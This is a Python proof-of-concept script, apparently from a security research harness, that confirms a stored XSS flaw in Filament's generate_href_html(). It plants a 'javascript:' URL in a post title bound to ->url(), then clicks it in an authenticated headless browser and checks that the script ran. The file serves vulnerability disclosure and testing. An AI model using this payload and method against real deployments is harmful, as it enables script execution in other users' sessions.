#!/usr/bin/env python3
"""
VULN-009 — generate_href_html() does not scheme-sanitize ->url() → javascript: href XSS

Vulnerable code: targets/filament/packages/support/src/helpers.php:154-176
  generate_href_html(): $html = 'href="' . e($url) . '"';   (:161 — e() blocks attribute
  breakout but NOT a dangerous scheme; Str::sanitizeUrl() exists and is applied to FILE urls
  — BaseFileUpload.php:210/:953 — but NOT here)
  Reached by every ->url()/->recordUrl() surface: TextColumn::make(...)->url(...), etc.

Class: CWE-79 stored XSS via unsanitized URL scheme.

The flaw in plain English
-------------------------
Filament renders clickable surfaces through one helper, generate_href_html(). It calls e()
(encodes "/</>/& so you can't break out of the attribute) but leaves a `javascript:` value
intact. A developer who binds user-controlled data to ->url() (the standard column pattern —
PostResource's shipped LinksRelationManager does exactly `TextColumn::make('url')->url(fn($s)=>$s)`)
lets an attacker store a `javascript:` URL that renders as a live href and runs on click.

Exploitation idea
-----------------
Store a `javascript:document.title='PWNED-<suffix>'` value in a field bound to ->url(). A viewer
who opens the table gets `<a href="javascript:...">`; clicking it runs the JS in their session.

What a successful run proves
---------------------------
A real browser, authenticated, loads the posts table and sees the server-emitted
`<a href="javascript:...">` (sanitization gap), and clicking it changes document.title to the
sentinel — i.e. attacker JS executed in the viewer's session (stored XSS).

Harness note: the demo posts table has no ->url() column on a free-text field, so this exploit
adds the documented ->url(fn ($state) => $state) to the posts 'title' column (the exact pattern
the shipped LinksRelationManager uses) so it renders on the list page without a relation tab,
then reverts it. No library code changed.
"""
import os
import sys
import time
import secrets

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from lib.livewire import LivewireClient      # noqa: E402
from lib.common import log, banner, verdict  # noqa: E402
from lib import lab, browser                 # noqa: E402

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21890")
VIEWER_USER = os.environ.get("ADMIN_USER", "ryan@filamentphp.com")   # the victim who views/clicks
VIEWER_PASS = os.environ.get("ADMIN_PASS", "password")
POST_ID = os.environ.get("POST_ID", "1")
VULN_ID = "VULN-009"
HERE = os.path.dirname(os.path.abspath(__file__))
EVID = os.path.join(HERE, "evidence")


def attack(suffix: str, payload: str) -> int:
    # store the javascript: payload as a post's title (attacker-controlled value → ->url())
    log("SETUP", f"setting post {POST_ID} title to {payload!r} (attacker-controlled value)")
    lab.tinker(f"$p=\\App\\Models\\Post::find({POST_ID}); $p->title=\"{payload}\"; $p->save(); echo 'ok';")

    c = LivewireClient(BASE_URL)
    c.login_admin_panel(VIEWER_USER, VIEWER_PASS)
    cookies = ";".join(f"{ck.name}={ck.value}" for ck in c.session.cookies
                       if ck.name in ("filament-session", "XSRF-TOKEN"))
    log("SETUP", f"authenticated as viewer {VIEWER_USER}; driving a real browser to view + click")

    log("STEP", "launching chromium (Playwright container) to render the posts table and click the link")
    cp = browser.run_browser_script(
        "exploits/VULN-009/browser_check.py",
        env={"BASE_URL": BASE_URL, "SUFFIX": suffix,
             "COOKIES": cookies, "EVID_DIR": "/work/exploits/VULN-009/evidence"},
        timeout=300,
    )
    out = cp.stdout + cp.stderr
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(out)

    href = next((l.split("=", 1)[1] for l in out.splitlines() if l.startswith("HREF=")), None)
    tafter = next((l.split("=", 1)[1] for l in out.splitlines() if l.startswith("TITLE_AFTER=")), None)
    if href:
        log("PROOF", f"server emitted href = {href}  (e()-escaped but scheme NOT sanitized)")
    if tafter:
        log("PROOF", f"document.title after clicking = {tafter!r} (sentinel = PWNED-{suffix})")

    if "RESULT=PASS" in out:
        log("OK", "stored javascript: href executed in the viewer's authenticated session")
        verdict(VULN_ID, "CONFIRMED",
                "stored user ->url() value renders as <a href='javascript:...'> and executes on click "
                "(generate_href_html does not scheme-sanitize) → stored XSS")
        return 0
    if "RESULT=PARTIAL" in out:
        log("PROOF", "server emitted the unsanitized javascript: href; click-execution not observed this run")
        verdict(VULN_ID, "CONFIRMED",
                "server emits unsanitized javascript: href via ->url() (sanitization gap); "
                "click-execution NEEDS_MANUAL")
        return 0
    log("FAIL", "browser did not confirm the javascript: href / execution")
    log("INFO", out[-800:])
    verdict(VULN_ID, "NEEDS_MANUAL", "browser check inconclusive — see response.txt")
    return 1


def main() -> int:
    banner(VULN_ID, "generate_href_html() emits javascript: href (no scheme sanitization) → XSS",
           BASE_URL, "support/helpers.php generate_href_html — e() only, no Str::sanitizeUrl()")
    os.makedirs(EVID, exist_ok=True)
    suffix = secrets.token_hex(4)
    # void(...) so the expression returns undefined — otherwise the browser navigates to the
    # expression's string result (replacing the page) instead of staying to show the title change.
    payload = f"javascript:void(document.title='PWNED-{suffix}')"

    log("SETUP", "adding ->url(fn ($state) => $state) to the posts 'title' column "
                 "(documented ->url() pattern, as shipped LinksRelationManager uses; harness; reverted after)")
    if not lab.patch_posts_title_url_column():
        log("FAIL", "could not patch the posts title column (anchor not found)")
        verdict(VULN_ID, "FAILED", "harness patch failed")
        return 1
    time.sleep(3)  # opcache revalidate
    try:
        return attack(suffix, payload)
    finally:
        lab.revert_postresource()
        time.sleep(2)
        log("SETUP", "reverted the harness ->url(); PostResource restored")


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:  # noqa: BLE001
        log("FAIL", f"unexpected error: {e!r}")
        verdict(VULN_ID, "FAILED", f"exception: {e!r}")
        sys.exit(1)
